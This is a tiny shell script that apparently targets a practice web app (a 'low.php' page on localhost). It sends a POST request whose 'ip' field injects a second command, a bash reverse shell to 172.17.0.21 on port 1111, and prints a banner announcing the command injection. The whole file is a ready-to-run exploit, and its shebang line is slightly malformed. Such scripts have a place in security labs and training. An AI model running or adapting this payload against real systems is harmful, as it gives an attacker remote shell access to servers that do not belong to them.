#/bin/sh

echo -e "\e[92mExecuting Command Injection to execute reverse shell."
curl -X POST -d "ip=1.1.1.1+%26%26+bash+-i+%3E%26+%2Fdev%2Ftcp%2F172.17.0.21%2F1111+0%3E%261&Submit=Submit" http://localhost/low.php
